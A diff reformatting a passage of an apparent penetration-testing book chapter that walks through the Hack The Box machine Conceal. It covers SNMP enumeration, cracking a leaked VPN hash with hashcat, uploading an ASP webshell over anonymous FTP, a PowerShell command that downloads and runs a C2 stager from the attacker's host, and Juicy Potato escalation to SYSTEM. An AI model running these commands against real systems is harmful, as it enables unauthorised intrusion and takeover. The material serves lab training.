@@ -115,403 +115,224 @@ We can now interact with the grunt using the Interact tab and use one of a selec
 
 Covenant provides a long list of other tasks that can be run on the target machine that include methods for bypassing AMSI and UAC, uploading and downloading files, navigating the file system and running software and other commands.
 
-
-
-
-
-
-
-
-
-Hack The Box Case Study: Conceal
+### Hack The Box Case Study: Conceal
 
 Conceal is a Windows box that requires enumeration of UDP to discover information available through SNMP. With this information, you can configure a IPSec VPN to connect to the box and then enumerate the TCP ports. The machine has FTP and HTTP open and using that we can upload a reverse shell, execute it through the web application and then get onto the box. Once there, the privilege escalation is straightforward as the user has the SeImpersonate privilege which can be exploited via Juicy Potato. Once the enumeration and IPSec VPN is set up, we will exploit the box using Covenant.
 
 An initial nmap scan reveals no TCP ports open. Doing a UDP scan shows two open ports. 161 which is running an SNMP process and 500 which is running an IKE VPN port. nmap will enumerate public information from this interface and so returns information about network interfaces, network ports that are open on the machine and processes that are running:
 
+```bash
 PORT STATE SERVICE VERSION
-
-161/udp open snmp SNMPv1 server \(public\)
-
-\| snmp-interfaces:
-
-\| Software Loopback Interface 1\x00
-
-\| IP address: 127.0.0.1 Netmask: 255.0.0.0
-
-\| Type: softwareLoopback Speed: 1 Gbps
-
-\| Status: up
-
-\| Traffic stats: 0.00 Kb sent, 0.00 Kb received
-
-\| WAN Miniport \(IKEv2\)\x00
-
-\| Type: tunnel Speed: 0 Kbps
-
-\| Traffic stats: 0.00 Kb sent, 0.00 Kb received
-
-\| vmxnet3 Ethernet Adapter\x00
-
-\| IP address: 10.129.1.51 Netmask: 255.255.0.0
-
-\| MAC address: 00:50:56:b9:31:39 \(VMware\)
-
-\| Type: ethernetCsmacd Speed: 4 Gbps
-
-\| Status: up
-
-\| Traffic stats: 539.69 Kb sent, 20.09 Mb received
-
-\| WAN Miniport \(PPTP\)\x00
-
-\| Type: tunnel Speed: 0 Kbps
-
-\| Traffic stats: 0.00 Kb sent, 0.00 Kb received
-
-\| Microsoft Kernel Debug Network Adapter\x00
-
-\| Type: ethernetCsmacd Speed: 0 Kbps
-
-\| Traffic stats: 0.00 Kb sent, 0.00 Kb received
-
-\| WAN Miniport \(L2TP\)\x00
-
-\| Type: tunnel Speed: 0 Kbps
-
-\| Traffic stats: 0.00 Kb sent, 0.00 Kb received
-
-\| Teredo Tunneling Pseudo-Interface\x00
-
-\| MAC address: Unknown
-
-\| Type: tunnel Speed: 0 Kbps
-
-\| Traffic stats: 0.00 Kb sent, 0.00 Kb received
-
-\| WAN Miniport \(IP\)\x00
-
-\| Type: ethernetCsmacd Speed: 0 Kbps
-
-\| Traffic stats: 0.00 Kb sent, 0.00 Kb received
-
-&lt;SNIP&gt;
-
-\| snmp-netstat:
-
-\| TCP 0.0.0.0:21 0.0.0.0:0
-
-\| TCP 0.0.0.0:80 0.0.0.0:0
-
-\| TCP 0.0.0.0:135 0.0.0.0:0
-
-\| TCP 0.0.0.0:445 0.0.0.0:0
-
-\| TCP 0.0.0.0:49664 0.0.0.0:0
-
-\| TCP 0.0.0.0:49665 0.0.0.0:0
-
-\| TCP 0.0.0.0:49666 0.0.0.0:0
-
-\| TCP 0.0.0.0:49667 0.0.0.0:0
-
-\| TCP 0.0.0.0:49668 0.0.0.0:0
-
-\| TCP 0.0.0.0:49669 0.0.0.0:0
-
-\| TCP 0.0.0.0:49670 0.0.0.0:0
-
-\| TCP 10.129.1.51:139 0.0.0.0:0
-
-\| UDP 0.0.0.0:123 \*:\*
-
-\| UDP 0.0.0.0:161 \*:\*
-
-\| UDP 0.0.0.0:500 \*:\*
-
-\| UDP 0.0.0.0:4500 \*:\*
-
-\| UDP 0.0.0.0:5050 \*:\*
-
-\| UDP 0.0.0.0:5353 \*:\*
-
-\| UDP 0.0.0.0:5355 \*:\*
-
-\| UDP 0.0.0.0:62366 \*:\*
-
-\| UDP 10.129.1.51:137 \*:\*
-
-\| UDP 10.129.1.51:138 \*:\*
-
-\| UDP 10.129.1.51:1900 \*:\*
-
-\| UDP 10.129.1.51:53925 \*:\*
-
-\| UDP 127.0.0.1:1900 \*:\*
-
-\|\_ UDP 127.0.0.1:53926 \*:\*
-
-\| snmp-processes:
-
-\| 1:
-
-\| Name: System Idle Process
-
-\| 4:
-
-\| Name: System
-
-\| 292:
-
-\| Name: smss.exe
-
-\| 320:
-
-\| Name: svchost.exe
-
-\| Path: C:\Windows\System32\
-
-\| Params: -k LocalServiceNetworkRestricted
-
-\| 340:
-
-\| Name: svchost.exe
-
-\| Path: C:\Windows\system32\
-
-\| Params: -k LocalServiceNoNetwork
-
-\| 372:
-
-\| Name: csrss.exe
-
-\| 456:
-
-\| Name: wininit.exe
-
-\| 468:
-
-\| Name: csrss.exe
-
-\| 472:
-
-\| Name: svchost.exe
-
-\| Path: C:\Windows\system32\
-
-\| Params: -k LocalService
-
-\| 540:
-
-\| Name: winlogon.exe
-
-\| 600:
-
-\| Name: services.exe
-
-\| 608:
-
-\| Name: lsass.exe
-
-\| Path: C:\Windows\system32\
-
-\| 696:
-
-\| Name: svchost.exe
-
-\| Path: C:\Windows\system32\
-
-\| Params: -k DcomLaunch
-
-\| 712:
-
-\| Name: fontdrvhost.exe
-
-\| 720:
-
-\| Name: fontdrvhost.exe
-
-\| 808:
-
-\| Name: svchost.exe
-
-\| Path: C:\Windows\system32\
-
-\| Params: -k RPCSS
-
-\| 892:
-
-\| Name: dwm.exe
-
-\| 948:
-
-\| Name: svchost.exe
-
-\| Path: C:\Windows\system32\
-
-\| Params: -k netsvcs
-
-&lt;SNIP&gt;
+161/udp open snmp SNMPv1 server (public)
+| snmp-interfaces:
+| Software Loopback Interface 1\x00
+| IP address: 127.0.0.1 Netmask: 255.0.0.0
+| Type: softwareLoopback Speed: 1 Gbps
+| Status: up
+| Traffic stats: 0.00 Kb sent, 0.00 Kb received
+| WAN Miniport (IKEv2)\x00
+| Type: tunnel Speed: 0 Kbps
+| Traffic stats: 0.00 Kb sent, 0.00 Kb received
+| vmxnet3 Ethernet Adapter\x00
+| IP address: 10.129.1.51 Netmask: 255.255.0.0
+| MAC address: 00:50:56:b9:31:39 (VMware)
+| Type: ethernetCsmacd Speed: 4 Gbps
+| Status: up
+| Traffic stats: 539.69 Kb sent, 20.09 Mb received
+| WAN Miniport (PPTP)\x00
+| Type: tunnel Speed: 0 Kbps
+| Traffic stats: 0.00 Kb sent, 0.00 Kb received
+| Microsoft Kernel Debug Network Adapter\x00
+| Type: ethernetCsmacd Speed: 0 Kbps
+| Traffic stats: 0.00 Kb sent, 0.00 Kb received
+| WAN Miniport (L2TP)\x00
+| Type: tunnel Speed: 0 Kbps
+| Traffic stats: 0.00 Kb sent, 0.00 Kb received
+| Teredo Tunneling Pseudo-Interface\x00
+| MAC address: Unknown
+| Type: tunnel Speed: 0 Kbps
+| Traffic stats: 0.00 Kb sent, 0.00 Kb received
+| WAN Miniport (IP)\x00
+| Type: ethernetCsmacd Speed: 0 Kbps
+| Traffic stats: 0.00 Kb sent, 0.00 Kb received
+<SNIP>
+| snmp-netstat:
+| TCP 0.0.0.0:21 0.0.0.0:0
+| TCP 0.0.0.0:80 0.0.0.0:0
+| TCP 0.0.0.0:135 0.0.0.0:0
+| TCP 0.0.0.0:445 0.0.0.0:0
+| TCP 0.0.0.0:49664 0.0.0.0:0
+| TCP 0.0.0.0:49665 0.0.0.0:0
+| TCP 0.0.0.0:49666 0.0.0.0:0
+| TCP 0.0.0.0:49667 0.0.0.0:0
+| TCP 0.0.0.0:49668 0.0.0.0:0
+| TCP 0.0.0.0:49669 0.0.0.0:0
+| TCP 0.0.0.0:49670 0.0.0.0:0
+| TCP 10.129.1.51:139 0.0.0.0:0
+| UDP 0.0.0.0:123 *:*
+| UDP 0.0.0.0:161 *:*
+| UDP 0.0.0.0:500 *:*
+| UDP 0.0.0.0:4500 *:*
+| UDP 0.0.0.0:5050 *:*
+| UDP 0.0.0.0:5353 *:*
+| UDP 0.0.0.0:5355 *:*
+| UDP 0.0.0.0:62366 *:*
+| UDP 10.129.1.51:137 *:*
+| UDP 10.129.1.51:138 *:*
+| UDP 10.129.1.51:1900 *:*
+| UDP 10.129.1.51:53925 *:*
+| UDP 127.0.0.1:1900 *:*
+|_ UDP 127.0.0.1:53926 *:*
+| snmp-processes:
+| 1:
+| Name: System Idle Process
+| 4:
+| Name: System
+| 292:
+| Name: smss.exe
+| 320:
+| Name: svchost.exe
+| Path: C:\Windows\System32\
+| Params: -k LocalServiceNetworkRestricted
+| 340:
+| Name: svchost.exe
+| Path: C:\Windows\system32\
+| Params: -k LocalServiceNoNetwork
+| 372:
+| Name: csrss.exe
+| 456:
+| Name: wininit.exe
+| 468:
+| Name: csrss.exe
+| 472:
+| Name: svchost.exe
+| Path: C:\Windows\system32\
+| Params: -k LocalService
+| 540:
+| Name: winlogon.exe
+| 600:
+| Name: services.exe
+| 608:
+| Name: lsass.exe
+| Path: C:\Windows\system32\
+| 696:
+| Name: svchost.exe
+| Path: C:\Windows\system32\
+| Params: -k DcomLaunch
+| 712:
+| Name: fontdrvhost.exe
+| 720:
+| Name: fontdrvhost.exe
+| 808:
+| Name: svchost.exe
+| Path: C:\Windows\system32\
+| Params: -k RPCSS
+| 892:
+| Name: dwm.exe
+| 948:
+| Name: svchost.exe
+| Path: C:\Windows\system32\
+| Params: -k netsvcs
+<SNIP>
+```
 
 We can use the utility snmpwalk.pl to enumerate SNMP on the machine. As a reminder, SNMP is the Simple Network Management Protocol which is a protocol for collecting information from devices and sending commands to control them. SNMP uses a hierarchical namespace to organize information about a device. This is called a management information base \(MIB\). MIBs use object identifiers \(OID\) to identify individual items within a MIB.
 
 When we do snmapwalk on Conceal, we get a huge amout of information back although the OIDs are not translated into proper labels.
 
-┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Conceal\]
-
+```bash
+┌─[✗]─[rin@parrot]─[~/boxes/Conceal]
 └──╼ $perl /usr/share/doc/libnet-snmp-perl/examples/snmpwalk.pl -c public -v2c conceal.htb
-
-1.3.6.1.2.1.1.1.0 = OCTET STRING: Hardware: AMD64 Family 23 Model 49 Stepping 0 AT/AT COMPATIBLE - Software: Windows Version 6.3 \(Build
-
- 15063 Multiprocessor Free\)
-
+1.3.6.1.2.1.1.1.0 = OCTET STRING: Hardware: AMD64 Family 23 Model 49 Stepping 0 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build
+ 15063 Multiprocessor Free)
 1.3.6.1.2.1.1.2.0 = OBJECT IDENTIFIER: 1.3.6.1.4.1.311.1.1.3.1.1
-
 1.3.6.1.2.1.1.3.0 = TimeTicks: 23 hours, 34:05.00
-
 1.3.6.1.2.1.1.4.0 = OCTET STRING: IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
-
 1.3.6.1.2.1.1.5.0 = OCTET STRING: Conceal
-
 1.3.6.1.2.1.1.6.0 = OCTET STRING:
-
 1.3.6.1.2.1.1.7.0 = INTEGER: 76
-
 1.3.6.1.2.1.2.1.0 = INTEGER: 16
-
 1.3.6.1.2.1.2.2.1.1.1 = INTEGER: 1
-
 1.3.6.1.2.1.2.2.1.1.2 = INTEGER: 2
-
 1.3.6.1.2.1.2.2.1.1.3 = INTEGER: 3
-
 1.3.6.1.2.1.2.2.1.1.4 = INTEGER: 4
-
 1.3.6.1.2.1.2.2.1.1.5 = INTEGER: 5
-
 1.3.6.1.2.1.2.2.1.1.6 = INTEGER: 6
-
 1.3.6.1.2.1.2.2.1.1.7 = INTEGER: 7
-
 1.3.6.1.2.1.2.2.1.1.8 = INTEGER: 8
-
 1.3.6.1.2.1.2.2.1.1.9 = INTEGER: 9
-
 1.3.6.1.2.1.2.2.1.1.10 = INTEGER: 10
-
 1.3.6.1.2.1.2.2.1.1.11 = INTEGER: 11
-
 1.3.6.1.2.1.2.2.1.1.12 = INTEGER: 12
-
 1.3.6.1.2.1.2.2.1.1.13 = INTEGER: 13
-
 1.3.6.1.2.1.2.2.1.1.14 = INTEGER: 14
-
 1.3.6.1.2.1.2.2.1.1.15 = INTEGER: 15
-
 1.3.6.1.2.1.2.2.1.1.16 = INTEGER: 16
-
 1.3.6.1.2.1.2.2.1.2.1 = OCTET STRING: Software Loopback Interface 1
-
-1.3.6.1.2.1.2.2.1.2.2 = OCTET STRING: WAN Miniport \(IKEv2\)
-
+1.3.6.1.2.1.2.2.1.2.2 = OCTET STRING: WAN Miniport (IKEv2)
 1.3.6.1.2.1.2.2.1.2.3 = OCTET STRING: vmxnet3 Ethernet Adapter
-
-&lt;SNIP&gt;
+<SNIP>
+```
 
 One thing we notice immediately is that there is an IKE VPN password PSK \(pre-shared key\) which is 9C8B1A372B1878851BE2C097031B6E43. If we check this hash online, or through listing hashcat hash examples, it is likely to be an NTLM hash. We can crack it with hashcat as follows:
 
-┌─\[rin@parrot\]─\[~/boxes/Conceal\]
-
+```bash
+┌─[rin@parrot]─[~/boxes/Conceal]
 └──╼ $hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
-
-hashcat \(v6.1.1\) starting...
-
-&lt;SNIP&gt;
-
+hashcat (v6.1.1) starting...
+<SNIP>
 9c8b1a372b1878851be2c097031b6e43:Dudecake1!
-
 Session..........: hashcat
-
 Status...........: Cracked
-
 Hash.Name........: NTLM
+```
 
 We get the password "Dudecake!". Before we leave the SNMP enumeration, we can use another utility to enumerate it called snmp-check:
 
-┌─\[rin@parrot\]─\[~/boxes/Conceal\] \[454/578\]
-
+```bash
+┌─[rin@parrot]─[~/boxes/Conceal] [454/578]
 └──╼ $snmp-check 10.129.90.149
-
 snmp-check v1.9 - SNMP enumerator
-
-Copyright \(c\) 2005-2015 by Matteo Cantoni \(www.nothink.org\)
-
-\[+\] Try to connect to 10.129.90.149:161 using SNMPv1 and community 'public'
-
-\[\*\] System information:
-
+Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
+[+] Try to connect to 10.129.90.149:161 using SNMPv1 and community 'public'
+[*] System information:
  Host IP address : 10.129.90.149
-
  Hostname : Conceal
-
- Description : Hardware: AMD64 Family 23 Model 49 Stepping 0 AT/AT COMPATIBLE - Software: Windows Version 6.3 \(Build
-
- 15063 Multiprocessor Free\)
-
+ Description : Hardware: AMD64 Family 23 Model 49 Stepping 0 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build
+ 15063 Multiprocessor Free)
  Contact : IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
-
  Location : -
-
  Uptime snmp : 00:11:32.37
-
  Uptime system : 00:11:17.93
-
  System date : 2021-2-1 02:45:52.0
-
  Domain : WORKGROUP
-
-\[\*\] User accounts:
-
+[*] User accounts:
  Guest
-
  Destitute
-
  Administrator
-
  DefaultAccount
-
-&lt;SNIP&gt;
+<SNIP>
+```
 
 This produces labelled information from SNMP largely of the same content that was enumerated by nmap. We can see that there is a WAN Miniport \(IKEv2\) interface that is marked as being down. This, along with the open UDP port 500 and the IKE password suggests that the machine supports an IPSec VPN. The TCP connections show that FTP and HTTP are running on ports 21 and 80 but just not accessible from the outside, as we have previously seen from the nmap scan.
 
 To explore the IPSec on Conceal, we can use ike-scan:
 
-┌─\[rin@parrot\]─\[~/boxes/Conceal\]
-
+```bash
+┌─[rin@parrot]─[~/boxes/Conceal]
 └──╼ $sudo ike-scan -M 10.129.90.149
-
-Starting ike-scan 1.9.4 with 1 hosts \(http://www.nta-monitor.com/tools/ike-scan/\)
-
+Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
 10.129.90.149 Main Mode Handshake returned
-
- HDR=\(CKY-R=7eb8e09a6a37c7b8\)
-
- SA=\(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration\(4\)=0x00007080\)
-
- VID=1e2b516905991c7d7c96fcbfb587e46100000009 \(Windows-8\)
-
- VID=4a131c81070358455c5728f20e95452f \(RFC 3947 NAT-T\)
-
- VID=90cb80913ebb696e086381b5ec427b1f \(draft-ietf-ipsec-nat-t-ike-02\n\)
-
- VID=4048b7d56ebce88525e7de7f00d6c2d3 \(IKE Fragmentation\)
-
- VID=fb1de3cdf341b7ea16b7e5be0855f120 \(MS-Negotiation Discovery Capable\)
-
- VID=e3a5966a76379fe707228231e5ce8652 \(IKE CGA version 1\)
-
-Ending ike-scan 1.9.4: 1 hosts scanned in 0.338 seconds \(2.96 hosts/sec\). 1 returned handshake; 0 returned notify
+ HDR=(CKY-R=7eb8e09a6a37c7b8)
+ SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)
+ VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8)
+ VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T)
+ VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\n)
+ VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation)
+ VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable)
+ VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)
+Ending ike-scan 1.9.4: 1 hosts scanned in 0.338 seconds (2.96 hosts/sec). 1 returned handshake; 0 returned notify
+```
 
 The important information from this is the SA= line which represents the security association configuration information. ike-scan can sometimes get the hash using aggressive mode, but we already have the hash and in any case it doesn't work on Conceal.
 
@@ -529,15 +350,15 @@ Description automatically generated](../.gitbook/assets/8%20%286%29.png)
 
 Specifying the IP address of conceal.htb and our box
 
-We can leave the default setting for authentication inbound and outbound and then select the Advanced option for the Authentication Method \(Figure 10-10\)
+We can leave the default setting for authentication inbound and outbound and then select the Advanced option for the Authentication Method
 
 ![Graphical user interface, text, application
 
 Description automatically generated](../.gitbook/assets/9%20%281%29.png)
 
-Specifying the authentication method as a Preshared key Dudecake1!
+Specifying the authentication method as a Preshared key **Dudecake1!**
 
-We need to select the protocol type as TCP that will be carried by the tunnel \(Figure 10-11\)
+We need to select the protocol type as TCP that will be carried by the tunnel
 
 ![Graphical user interface, application, Teams
 
@@ -547,89 +368,70 @@ Configure the protocol type as TCP
 
 Finally, we give the connection a name and then can check if it is working by doing an nmap scan on port 445
 
+```text
 c:\Users\rin\Desktop
-
-λ nmap -p 445 -sT conceal.htb
-
-&lt;SNIP&gt;
-
+nmap -p 445 -sT conceal.htb
+<SNIP>
 PORT STATE SERVICE
-
 445/tcp open microsoft-ds
+```
 
 Now that we have a working tunnel in place, we can check FTP for anonymous access which it allows. There is nothing in the directory but it seems that we can upload files. Uploading a test.html file, we can navigate to the website on Conceal and that reveals the default IIS page. Putting in the URL http://conceal.htb/test.html gives a file not found. We could run gobuster on the site to see what the directory structure is but testing the a few well known paths gives us a hit on http://conceal.htb/upload/test.html.
 
 So we can upload files and access them via the web. This will allow us to upload a web shell from https://github.com/tennc/webshell/tree/master/asp. Lets upload that using ftp:
 
+```bash
 c:\Users\rin\Desktop
-
 λ ftp conceal.htb
-
 Connected to conceal.htb.
-
 220 Microsoft FTP Service
-
 200 OPTS UTF8 command successful - UTF8 encoding now ON.
-
-User \(conceal.htb:\(none\)\): anonymous
-
-331 Anonymous access allowed, send identity \(e-mail name\) as password.
-
+User (conceal.htb:(none)): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
 Password:
-
 230 User logged in.
-
-ftp&gt; put webshell.asp
-
+ftp> put webshell.asp
 200 PORT command successful.
-
 125 Data connection already open; Transfer starting.
-
 226 Transfer complete.
-
 ftp: 1405 bytes sent in 0.39Seconds 3.65Kbytes/sec.
-
-ftp&gt;
+ftp>
+```
 
 Typing in whoami into the cmd gives us conceal\destitute \(Figure 10-12\)
 
-![Graphical user interface, text, application, email
-
-Description automatically generated](../.gitbook/assets/11.png)
-
-whoami command in webshell on Conceal
+![whoami command in webshell on Conceal](../.gitbook/assets/11.png)
 
 On Covenant, we can use a Launcher to get a PowerShell script that we can put into a file grunt.ps1 and serve it using python -m http.server 8000 -bind 10.10.14.117. From the webshell, we can use the command:
 
-powershell "IEX\(New-Object Net.WebClient\).downloadString\('http://10.10.14.117:8000/grunt.ps1'\)"
+```bash
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.117:8000/grunt.ps1')"
+```
 
 You should see a hit on the python web server and then in Covenant, a notification that the grunt is active. Interacting with the grunt, we can send command such as whoami
 
-\[2/1/2021 5:34:27 AM UTC\] WhoAmI completed
-
-\(admin\) &gt; whoami
-
+```bash
+[2/1/2021 5:34:27 AM UTC] WhoAmI completed
+(admin) > whoami
 CONCEAL\Destitute
+```
 
 We can run Seatbelt -group=all which is an application like winPEAS and suggest privilege escalations for us. Going through the output, the current user has SeImpersonatePrivilege privilege. This means we can probably use Juicy Potato. We can get a release version of this from GitHub \(https://github.com/ohpe/juicy-potato\) and upload it using the command upload in Covenant. We can upload to c:\Users\Destitute\Desktop. We will also upload the PowerShell script from the Launcher as a batch file. We can run Juicy Potato then with the command
 
-\(admin\) &gt; cmd .\juicy.exe -t \* -p c:\users\destitute\desktop\grunt.bat -l 9001 -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
-
+```bash
+(admin) > cmd .\juicy.exe -t * -p c:\users\destitute\desktop\grunt.bat -l 9001 -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
 Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} 9001
-
 ......
-
-\[+\] authresult 0
-
+[+] authresult 0
 {e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM
-
-\[+\] CreateProcessWithTokenW OK
+[+] CreateProcessWithTokenW OK
+```
 
 Note that the CLSID is something that I got from the site https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows\_10\_Enterprise\) and it is for the Windows Update Server \(wuaserv\). On running the batch file, we will get another grunt activated on Covenant and this time it will be as user NT Authority\System
 
-\[2/1/2021 6:05:20 AM UTC\] WhoAmI completed
-
-\(admin\) &gt; whoami
-
+```bash
+[2/1/2021 6:05:20 AM UTC] WhoAmI completed
+(admin) > whoami
 NT AUTHORITY\SYSTEM
+```
 
